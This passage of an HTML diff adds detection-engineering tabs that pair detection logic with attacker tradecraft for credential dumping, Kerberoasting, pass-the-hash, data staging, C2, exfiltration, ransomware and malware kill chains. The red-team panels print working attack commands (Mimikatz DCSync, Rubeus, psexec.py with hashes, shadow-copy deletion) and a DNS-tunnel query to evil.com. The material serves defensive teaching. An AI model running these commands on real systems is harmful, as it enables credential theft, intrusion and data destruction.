+  <div class="note-box">🔑 CREDENTIAL ACCESS — The pivot point of most enterprise intrusions. Once credentials are obtained, lateral movement and persistence become trivial. Minimum truth: something reads protected credential stores or intercepts authentication flows.</div>
+
+  <div class="ecosystem" id="eco-cred">
+    <div class="ecosystem-header" onclick="toggleEco('eco-cred')">
+      <div class="eco-id">T1003.001</div>
+      <div>
+        <div class="eco-title">LSASS Memory Credential Dumping</div>
+        <div class="eco-tactic">CREDENTIAL ACCESS · SUBSTRATE-FIRST DETECTION</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">LSASS Memory Access Anchor — Non-System Process OpenProcess to LSASS</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              LSASS holds plaintext credentials, NTLM hashes, and Kerberos tickets in memory. Any non-system process opening a handle to LSASS with <code>PROCESS_VM_READ</code> access is structurally anomalous. MDE surfaces this as a DeviceEvents <code>OpenProcessApiCall</code> event — the composite anchors on this with reinforcement from: process not in approved list, SeDebugPrivilege enabled, handle duplication to LSASS, or minidump creation.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Why LSASS?</strong> A single successful LSASS dump on a domain controller or admin workstation yields NTLM hashes for every user who has authenticated to that machine. Pass-the-hash with a domain admin hash = complete domain compromise in minutes.<br><br>
+              <strong>Mimikatz sekurlsa::logonpasswords</strong> is the canonical tool. Modern variants: ProcDump to create minidump, comsvcs.dll MiniDump (LOLBin), Nanodump (direct syscall to avoid API hooks), SilentProcessExit registry technique to trigger WER dump without touching LSASS directly.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Mimikatz</span>
+                <span class="malware-tag tag-red">Nanodump</span>
+                <span class="malware-tag tag-red">pypykatz</span>
+                <span class="malware-tag tag-red">SharpKatz</span>
+                <span class="malware-tag tag-gold">APT28</span>
+                <span class="malware-tag tag-gold">Sandworm</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-cred-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-cred-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">DCSync Attack — Rogue DC Replication Request</div>
+                <div class="cousin-ttp">T1003.006</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Credential Access (post domain admin)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">DCSync abuses the AD replication protocol to request credential data from a DC without needing to touch LSASS directly. Minimum truth: a non-DC machine or account making <code>MS-DRSR</code> replication calls to a domain controller — specifically <code>GetNCChanges</code> for sensitive attributes. Monitor for 4662 events with replication permission GUIDs from non-DC source accounts.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Why DCSync over LSASS dump:</strong> Never touches the DC disk or memory directly. Mimikatz <code>lsadump::dcsync /user:krbtgt</code> requests the krbtgt hash via legitimate DC replication protocol. With the krbtgt hash an attacker creates <strong>Golden Tickets</strong> — Kerberos tickets valid for 10 years that grant access to any service in the domain, persisting even through password resets.<br><br>
+                  <strong>Required privileges:</strong> Domain admin, or an account with Replicating Directory Changes All rights — these rights are sometimes misconfigured on service accounts.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Mimikatz dcsync</span>
+                    <span class="malware-tag tag-red">Impacket secretsdump</span>
+                    <span class="malware-tag tag-gold">APT29</span>
+                    <span class="malware-tag tag-gold">Lazarus</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-cred-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-cred-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">Kerberoasting — SPN Ticket Request Harvest</div>
+                <div class="cousin-ttp">T1558.003</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Credential Access (any authenticated user)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Any authenticated user can request Kerberos service tickets for any SPN. The ticket is encrypted with the service account's NTLM hash — take it offline and crack it. Detection: anomalous volume of TGS-REQ requests (4769) for RC4-encrypted tickets from a single source, especially for high-value service accounts (SQL, IIS) within a short time window. RC4 is the crack-friendly encryption — legitimate services use AES.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Why powerful:</strong> Requires no elevated privileges. Any domain user can Kerberoast. Service accounts frequently have weak passwords and excessive AD rights (Domain Admin "for convenience").<br><br>
+                  <strong>Tool:</strong> Rubeus <code>kerberoast /rc4opsec</code> — requests RC4 tickets for all SPNs, dumps them for offline cracking with Hashcat. A weak service account password cracked in minutes grants whatever rights that account has.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Rubeus</span>
+                    <span class="malware-tag tag-red">Impacket GetUserSPNs</span>
+                    <span class="malware-tag tag-red">PowerView</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: DISCOVERY -->
+<!-- ============================================================ -->
+<div id="tab-discovery" class="tab-content">
+  <div class="note-box">🔍 DISCOVERY — Attackers map the environment before moving. High-velocity, automated discovery is the minimum truth signal — humans don't enumerate 500 hosts in 30 seconds.</div>
+
+  <div class="ecosystem" id="eco-disc">
+    <div class="ecosystem-header" onclick="toggleEco('eco-disc')">
+      <div class="eco-id">T1018 · T1082 · T1083</div>
+      <div>
+        <div class="eco-title">Network & Host Discovery Sweep</div>
+        <div class="eco-tactic">DISCOVERY · VELOCITY-BASED COMPOSITE DETECTION</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Discovery Velocity Anchor — Multi-Command Burst from Single Process</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Individual discovery commands (net user, ipconfig, whoami) are completely normal. The composite anchors on <strong>velocity and chaining</strong>: 5+ distinct discovery commands executed by the same process within a 120-second window. This is structurally a script or automated tool, not a human admin. Reinforcement: commands executing from unusual parents (WmiPrvSE, PowerShell, non-admin tools), output redirection to files, commands targeting remote hosts.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Standard post-exploitation enumeration (Cobalt Strike/Empire):</strong><br>
+              Automated runbooks execute within seconds of establishing a beacon: <code>whoami /all</code>, <code>net user /domain</code>, <code>net group "Domain Admins" /domain</code>, <code>ipconfig /all</code>, <code>arp -a</code>, <code>netstat -an</code>, <code>systeminfo</code>.<br><br>
+              This burst pattern is identical across Cobalt Strike, Metasploit, Empire, and manual pentests — it's the fingerprint of post-exploitation enumeration regardless of the tool used.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Cobalt Strike post-ex</span>
+                <span class="malware-tag tag-red">Empire situational awareness</span>
+                <span class="malware-tag tag-red">BloodHound</span>
+                <span class="malware-tag tag-gold">Most threat actor groups</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-disc-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-disc-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">BloodHound / AD Enumeration via LDAP</div>
+                <div class="cousin-ttp">T1069.002 · T1087.002</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Discovery → Lateral Movement planning</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">BloodHound ingests massive volumes of LDAP queries to map Active Directory attack paths. Detection: anomalous LDAP query volume from a workstation (not a DC or management server), LDAP queries for sensitive attributes (msds-allowedtodelegateto, AdminCount, SIDHistory) in rapid succession, SAMR enumeration of domain groups from non-admin accounts.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>BloodHound is the attacker's GPS for AD.</strong> Running SharpHound collector takes 2-3 minutes and maps every attack path to Domain Admin. The output shows: which users are local admins on which machines, which machines have unconstrained delegation, Kerberoastable accounts with their hashcrack priority.<br><br>
+                  <strong>Kill chain value:</strong> Transforms lateral movement from guesswork to shortest-path algorithm. Most enterprise compromises that reach Domain Admin used BloodHound or equivalent.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">SharpHound</span>
+                    <span class="malware-tag tag-red">BloodHound</span>
+                    <span class="malware-tag tag-red">ldapdomaindump</span>
+                    <span class="malware-tag tag-gold">Most APT groups</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: LATERAL MOVEMENT -->
+<!-- ============================================================ -->
+<div id="tab-lateral" class="tab-content">
+  <div class="note-box">↔️ LATERAL MOVEMENT — Spreading from the initial foothold to target systems. Minimum truth: authenticated access to a new host using credentials not provisioned for that user/system pairing in normal operations.</div>
+
+  <div class="ecosystem" id="eco-lat">
+    <div class="ecosystem-header" onclick="toggleEco('eco-lat')">
+      <div class="eco-id">T1550.002</div>
+      <div>
+        <div class="eco-title">Pass-the-Hash / Pass-the-Ticket Lateral Movement</div>
+        <div class="eco-tactic">LATERAL MOVEMENT · CREDENTIAL-BASED MOVEMENT</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Anomalous Logon Source + Admin Share Access Composite</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Pass-the-hash produces a type 3 (network) logon using an NTLM hash rather than a password. Detection combines: 4624 type 3 logons from unexpected source hosts for privileged accounts, immediately followed by admin share access (C$, ADMIN$, IPC$) or remote service installation (7045), within a lateral movement time window. Cross-correlate with the credential dumping ecosystem — the hash used here was likely dumped in a preceding event indexed by the Atomic Sentinel Layer.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>PtH chain (Impacket):</strong><br>
+              <code>psexec.py DOMAIN/admin@192.168.1.50 -hashes :NTLMhash</code><br>
+              — authenticates with hash, drops a service binary to ADMIN$, starts it, returns a SYSTEM shell. No password needed. The hash was stolen from LSASS on a previously compromised host.<br><br>
+              <strong>Pass-the-Ticket (Rubeus):</strong> <code>Rubeus.exe ptt /ticket:[base64]</code> — injects a stolen Kerberos TGT into the current session. Subsequent Kerberos authentications use the stolen ticket — completely transparent to the network.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Impacket psexec/smbexec</span>
+                <span class="malware-tag tag-red">CrackMapExec</span>
+                <span class="malware-tag tag-red">Rubeus ptt</span>
+                <span class="malware-tag tag-gold">Lazarus Group</span>
+                <span class="malware-tag tag-gold">APT28</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: COLLECTION -->
+<!-- ============================================================ -->
+<div id="tab-collection" class="tab-content">
+  <div class="note-box">📦 COLLECTION — Aggregating data before exfiltration. Minimum truth: bulk access to sensitive file types or credential stores at anomalous velocity, or staging data in compressed archives in unusual locations.</div>
+
+  <div class="ecosystem" id="eco-coll">
+    <div class="ecosystem-header" onclick="toggleEco('eco-coll')">
+      <div class="eco-id">T1560.001</div>
+      <div>
+        <div class="eco-title">Data Staged in Archive — Pre-Exfil Compression</div>
+        <div class="eco-tactic">COLLECTION · ARCHIVE COLLECTED DATA</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Archive Creation in Non-Standard Path + Sensitive File Type Inclusion</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Attackers compress data before exfiltration to reduce transfer time and evade DLP controls that inspect individual file access but not archive contents. Minimum truth: archive utility (7zip, WinRAR, tar) creating archives in TEMP/ProgramData/network shares containing password-protected compressed files with .docx, .xlsx, .pdf, .kdbx file inclusions. Correlate with subsequent outbound HTTPS/FTP connections.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Standard exfil prep:</strong> <code>7z a -p[password] staged.zip C:\Users\*\Documents\*.docx C:\Users\*\Desktop\*.xlsx</code><br><br>
+              Password protection defeats content inspection by DLP tools. The archive is then exfiltrated via HTTPS to a cloud service (Dropbox, Google Drive, OneDrive) — indistinguishable from legitimate traffic without DLP that can inspect the upload.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">7zip LOLBin</span>
+                <span class="malware-tag tag-red">WinRAR</span>
+                <span class="malware-tag tag-gold">FIN7</span>
+                <span class="malware-tag tag-gold">APT41</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: C2 -->
+<!-- ============================================================ -->
+<div id="tab-c2" class="tab-content">
+  <div class="note-box">📡 COMMAND & CONTROL — The attacker's lifeline. Cutting C2 ends the intrusion. Minimum truth: periodic beaconing behaviour — regular intervals, jitter patterns, or protocol anomalies that distinguish C2 from legitimate traffic.</div>
+
+  <div class="ecosystem" id="eco-c2">
+    <div class="ecosystem-header" onclick="toggleEco('eco-c2')">
+      <div class="eco-id">T1071.001 · T1573</div>
+      <div>
+        <div class="eco-title">HTTPS C2 Beaconing — Encrypted Channel Detection</div>
+        <div class="eco-tactic">C2 · APPLICATION LAYER PROTOCOL · ENCRYPTED CHANNEL</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Beaconing Periodicity Anchor — Jitter-Tolerant Interval Composite</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              C2 beaconing is structurally distinct from human-driven web traffic: it's periodic, consistent in size, and persists regardless of user activity. The composite uses statistical analysis on connection frequency to a single external host: standard deviation of connection intervals below a threshold (indicating machine-driven regularity) combined with consistent byte sizes. Jitter is accommodated by analysing the distribution across 24 hours rather than exact intervals. Reinforcement: new domain (&lt;30 days), no HTTP referrer header, parent process anomaly.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Cobalt Strike default profile:</strong> Beacons every 60 seconds with 0% jitter. Trivially detected. <strong>Mature operators</strong> configure sleep timers of 1-4 hours with 30% jitter and malleable C2 profiles that mimic legitimate browser traffic (matching JA3 hashes of Chrome, mimicking Google Analytics requests).<br><br>
+              <strong>EtherRAT (MTDF original research):</strong> C2 delivered via Ethereum blockchain transactions — completely defeats domain/IP reputation, no C2 server to sinkhole, instructions embedded in public blockchain data. See Novel Research tab.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Cobalt Strike beacon</span>
+                <span class="malware-tag tag-red">Brute Ratel</span>
+                <span class="malware-tag tag-red">Sliver C2</span>
+                <span class="malware-tag tag-red">EtherRAT</span>
+                <span class="malware-tag tag-gold">APT29 NOBELIUM</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-c2-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-c2-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">DNS Tunnelling C2 Detection</div>
+                <div class="cousin-ttp">T1071.004</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: C2 (firewall-bypass technique)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">DNS is rarely blocked outbound. Tunnelling C2 through DNS encodes commands in subdomain query strings and responses in TXT records. Detection: anomalous DNS query length (legitimate queries rarely exceed 50 chars in subdomain), high entropy in subdomain labels (base64/hex encoded data), high query frequency to a single domain, TXT record responses with unusually long or high-entropy content.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Why DNS tunnelling:</strong> DNS port 53 UDP is almost never blocked. Many organisations don't log DNS at all. The attacker controls the authoritative DNS server for their domain — every DNS query is a C2 check-in, every response is a command.<br><br>
+                  <strong>Tool:</strong> Iodine, DNScat2, Cobalt Strike DNS beacon. Commands encoded in queries: <code>aGVsbG8=.evil.com</code> — the base64-encoded command is in the subdomain label.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">DNScat2</span>
+                    <span class="malware-tag tag-red">Iodine</span>
+                    <span class="malware-tag tag-red">Cobalt Strike DNS</span>
+                    <span class="malware-tag tag-gold">APT32 (OceanLotus)</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: EXFILTRATION -->
+<!-- ============================================================ -->
+<div id="tab-exfil" class="tab-content">
+  <div class="note-box">📤 EXFILTRATION — The objective of most financially-motivated intrusions. Minimum truth: unusual volume of outbound data to a non-corporate destination, or data leaving via a protocol not normally used for outbound transfer.</div>
+
+  <div class="ecosystem" id="eco-exfil">
+    <div class="ecosystem-header" onclick="toggleEco('eco-exfil')">
+      <div class="eco-id">T1048 · T1041</div>
+      <div>
+        <div class="eco-title">Exfiltration Over Alternative Protocol / C2 Channel</div>
+        <div class="eco-tactic">EXFILTRATION · DATA TRANSFER SIZE LIMITS</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Outbound Data Volume Anomaly + Destination Reputation Composite</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Volume-based exfil detection anchors on statistical deviation from baseline: a host transferring &gt;3 standard deviations from its 30-day average outbound volume in a single session. Reinforcement: destination is a cloud storage domain (mega.nz, anonfiles, gofile.io), destination domain is &lt;30 days old, transfer uses non-standard port, process making the transfer is not a known corporate sync client.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Ransomware group exfil pattern (double extortion):</strong> Before encrypting, groups like BlackCat and LockBit exfiltrate 50-500GB of data to prove they have it. Tools: rclone (syncs to cloud storage), MEGAcmd (direct MEGA upload), custom HTTPS upload scripts.<br><br>
+              Mature actors throttle transfer speed to stay under DLP volume thresholds — exfiltrating over 48-72 hours rather than in a single burst.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">rclone</span>
+                <span class="malware-tag tag-red">MEGAcmd</span>
+                <span class="malware-tag tag-red">WinSCP</span>
+                <span class="malware-tag tag-gold">BlackCat/ALPHV</span>
+                <span class="malware-tag tag-gold">Clop</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: IMPACT -->
+<!-- ============================================================ -->
+<div id="tab-impact" class="tab-content">
+  <div class="note-box">💥 IMPACT — The final act. Ransomware encryption, destructive wipers, service disruption. By this point detection has failed. The composite here is the last line — catch encryption in progress, not after the fact.</div>
+
+  <div class="ecosystem" id="eco-impact">
+    <div class="ecosystem-header" onclick="toggleEco('eco-impact')">
+      <div class="eco-id">T1486 · T1490</div>
+      <div>
+        <div class="eco-title">Ransomware Encryption + Shadow Copy Deletion</div>
+        <div class="eco-tactic">IMPACT · DATA ENCRYPTED FOR IMPACT</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Mass File Rename Velocity + VSS Deletion Anchor — Ransomware in Progress</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Ransomware detection during encryption is the last possible intervention. Minimum truth composite: <strong>file rename velocity &gt;100 files/minute with extension change + VSS deletion command</strong>. VSS deletion is nearly always the first action (<code>vssadmin delete shadows /all /quiet</code>, wmic shadowcopy delete) — catching this immediately before encryption begins provides a narrow window for automated response.<br><br>
+              SOAR integration: this composite should trigger automated isolation — the cost of a false positive (legitimate backup tool) is acceptable against the cost of a missed ransomware encryption event.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Standard ransomware pre-encryption sequence:</strong><br>
+              1. Verify domain admin, confirm all target hosts accessible<br>
+              2. Deploy ransomware binary via GPO or CrackMapExec to all hosts simultaneously<br>
+              3. Each host executes: delete VSS, stop backup services, terminate database processes (SQL, Exchange) to release file locks<br>
+              4. Begin encryption with RSA-encrypted symmetric key (AES-256)<br>
+              5. Drop ransom note in each encrypted directory<br><br>
+              Time from first VSS deletion to full encryption of a domain: 45 minutes to 4 hours depending on ransomware family and network speed.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">LockBit 3.0</span>
+                <span class="malware-tag tag-red">BlackCat/ALPHV</span>
+                <span class="malware-tag tag-red">Cl0p</span>
+                <span class="malware-tag tag-red">BlackByte</span>
+                <span class="malware-tag tag-gold">Storm-0830</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: NOVEL RESEARCH -->
+<!-- ============================================================ -->
+<div id="tab-novel" class="tab-content">
+
+  <div class="note-box">★ ORIGINAL MTDF RESEARCH — Novel threat families with original detection engineering. These ecosystems are not covered by vendor rule packs. All research is original, validated against simulated telemetry, and published at github.com/azdabat.</div>
+
+  <div class="stats-row">
+    <div class="stat-card"><div class="stat-number sn-gold">3</div><div class="stat-label">Novel Families</div></div>
+    <div class="stat-card"><div class="stat-number sn-red">15+</div><div class="stat-label">Original Rules</div></div>
+    <div class="stat-card"><div class="stat-number sn-blue">3</div><div class="stat-label">IR SOPs</div></div>
+    <div class="stat-card"><div class="stat-number sn-green">ORIGINAL</div><div class="stat-label">Not in vendor packs</div></div>
+  </div>
+
+  <!-- NOVEL: SilverFox / ValleyRAT -->
+  <div class="novel-card" id="nov-silverfox">
+    <div class="novel-header" onclick="toggleNovel('nov-silverfox')">
+      <div class="novel-badge">NOVEL RESEARCH #1</div>
+      <div class="novel-title">SilverFox / ValleyRAT — BYOVD Kill Chain</div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="novel-body">
+      <div class="two-col" style="margin-bottom:20px">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 DETECTION COVERAGE — 7 Rules, 3 Tiers</div>
+          <div class="panel-text">
+            <strong>Tier 1 — Stager Detection:</strong> Signed loader anomaly (legitimate cert, suspicious path/parent), DLL sideload of ValleyRAT initial stager, PE loaded from user-writable path with high-entropy section.<br><br>
+            <strong>Tier 2 — BYOVD Chain:</strong> Vulnerable driver drop + service creation composite, kernel callback deregistration attempt (via DeviceIoControl to driver handle), EDR process termination following driver load.<br><br>
+            <strong>Tier 3 — RAT Persistence:</strong> ValleyRAT module injection into system process, C2 beaconing pattern (periodic HTTPS with specific JA3 profile), byte-flip mutation defence via certificate thumbprint rather than hash matching.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 FULL KILL CHAIN — Hacker Perspective</div>
+          <div class="panel-text">
+            <strong>Actor:</strong> Chinese-nexus threat group. Targets: finance, crypto, enterprise Windows environments.<br><br>
+            <strong>Stage 1:</strong> Phishing delivers signed loader binary (legitimate certificate, custom packer). Loader performs DLL sideloading — drops malicious DLL alongside legitimate signed application.<br><br>
+            <strong>Stage 2:</strong> Sideloaded DLL drops vulnerable kernel driver (e.g., <code>gdrv.sys</code>). Exploits driver to gain ring-0 execution. Deregisters EDR kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks). EDR is blind.<br><br>
+            <strong>Stage 3:</strong> With EDR neutralised, ValleyRAT RAT deployed with full persistence. Byte-flipping applied to driver binary to defeat hash-based IOC blocking. C2 established over HTTPS.<br><br>
+            <strong>Why signature-based controls fail:</strong> Signed loader (cert trusted), LOLBin sideload (known-good app), vulnerable driver (Microsoft-signed), mutated hash (no IOC match), encrypted C2 (no payload inspection). Seven distinct evasion layers.
+            <div class="malware-tags">
+              <span class="malware-tag tag-red">SilverFox loader</span>
+              <span class="malware-tag tag-red">ValleyRAT</span>
+              <span class="malware-tag tag-gold">Chinese-nexus actor</span>
+              <span class="malware-tag tag-blue">CVE: gdrv.sys exploitation</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:8px">
+        <a href="https://github.com/azdabat" class="core-rule-link" target="_blank">📎 VIEW FULL RULE SET ON GITHUB → SilverFox-ValleyRAT Detection Rules</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- NOVEL: EtherRAT -->
+  <div class="novel-card" id="nov-etherrat">
+    <div class="novel-header" onclick="toggleNovel('nov-etherrat')">
+      <div class="novel-badge">NOVEL RESEARCH #2</div>
+      <div class="novel-title">EtherRAT / React2Shell — Blockchain C2 (CVE-2025-55182)</div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="novel-body">
+      <div class="two-col" style="margin-bottom:20px">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 DETECTION COVERAGE</div>
+          <div class="panel-text">
+            <strong>IIS Exploit Detection:</strong> CVE-2025-55182 React2Shell exploit chain — anomalous IIS worker process spawning cmd.exe/PowerShell, w3wp.exe executing unexpected child processes, IIS log entries matching exploit path patterns.<br><br>
+            <strong>Blockchain C2 Detection:</strong> Outbound connections to Ethereum RPC endpoints (Infura, Alchemy, direct node) from non-developer hosts, regular polling intervals to blockchain API endpoints, high-entropy data parsed from transaction <code>input</code> fields.<br><br>
+            <strong>Post-Exploitation:</strong> Standard post-ex composite rules apply once foothold established — the novelty is in the C2 channel, not the post-ex tradecraft.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 FULL KILL CHAIN — Why Blockchain C2 Is a Step Change</div>
+          <div class="panel-text">
+            <strong>The innovation:</strong> C2 commands are embedded in Ethereum blockchain transactions (in the <code>input data</code> field of a transaction to a smart contract). The RAT polls a public blockchain explorer API — <strong>there is no C2 server to sinkhole, no domain to block, no IP to blacklist.</strong><br><br>
+            <strong>Attack chain:</strong><br>
+            1. React2Shell exploit (CVE-2025-55182) delivers EtherRAT via IIS exploitation<br>
+            2. RAT establishes on target, begins polling Ethereum node for transactions to its designated address<br>
+            3. Operator sends Ethereum transaction with encoded command in input data field (gas cost: pennies)<br>
+            4. RAT decodes command from public blockchain — executes — encodes response in a new transaction<br>
+            5. Entire C2 channel runs over public internet infrastructure that cannot be taken down<br><br>
